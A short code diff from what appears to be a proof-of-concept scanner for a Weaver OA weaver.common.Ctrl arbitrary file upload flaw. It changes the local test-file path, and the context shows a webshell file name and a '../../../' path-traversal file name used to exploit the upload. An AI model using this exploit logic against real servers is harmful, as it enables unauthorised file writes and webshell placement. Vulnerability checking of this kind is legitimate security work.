@@ -17,7 +17,8 @@ def weaver_common_ctrl_upload(urllist):
         'name': '泛微OA weaver.common.Ctrl 任意文件上传漏洞',
         'vulnerable': False
     }
-    mm = 'TestFile_weaver_common_ctrl_upload'
+    path = str(os.path.abspath('.'))
+    mm = path + '\pocs\web\weaver\TestFile_weaver_common_ctrl_upload'
     del_file = './{0}.zip'.format(mm)    # 生成的垃圾文件
     webshell_name1 = mm + '.txt'
     webshell_name2 = '../../../' + webshell_name1
